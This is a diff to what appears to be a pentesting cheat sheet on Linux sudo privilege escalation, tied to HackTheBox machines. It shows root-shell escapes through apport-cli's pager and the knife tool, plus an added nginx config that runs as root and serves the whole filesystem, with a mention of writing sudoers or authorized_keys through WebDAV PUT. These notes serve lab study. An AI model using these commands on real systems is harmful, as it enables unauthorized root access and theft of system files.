@@ -136,13 +136,13 @@ $ sudo /usr/bin/apport-cli --file-bug
 > V # view report (open less)
 :!/bin/bash
 ```
-</div><div>
 
 * `/usr/bin/systemctl status xxx.service`
 
 [![sau](../../../../_badges/htb-p/sau.svg)](https://app.hackthebox.com/machines/Sau)
 
 While it seems secure, the reader opened is `less` which can be leveraged to run commands: `!/bin/bash`.
+</div><div>
 
 * `/usr/bin/knife`: [knife](http://manpages.ubuntu.com/manpages/bionic/man1/knife.1.html) can be exploited in many ways
 
@@ -154,5 +154,30 @@ $ sudo knife environment edit _default -e rootbash.sh
 $ sudo knife exec --exec "exec '/bin/sh -i'"
 $ echo -n 'exec "/bin/bash -i"' > config.rb
 $ sudo knife user list -c config.rb
+```
+
+* `nginx` can be used to read files. It may also be used to write files using `dav_methods PUT;`. For instance, adding an entry in authorized keys or sudoers.
+
+[![broker](../../../../_badges/htb-p/broker.svg)](https://app.hackthebox.com/machines/Broker)
+
+```shell!
+$ cat $(pwd)/test.conf
+user root;
+events {
+    worker_connections 768;
+}
+http {
+    server {
+       listen 80;
+        server_name  pwned.test;
+
+        location / {
+            root /;
+            autoindex on; 
+        }
+    }
+}
+$ sudo nginx -s stop
+$ sudo nginx -c $(pwd)/test.conf
 ```
 </div></div>
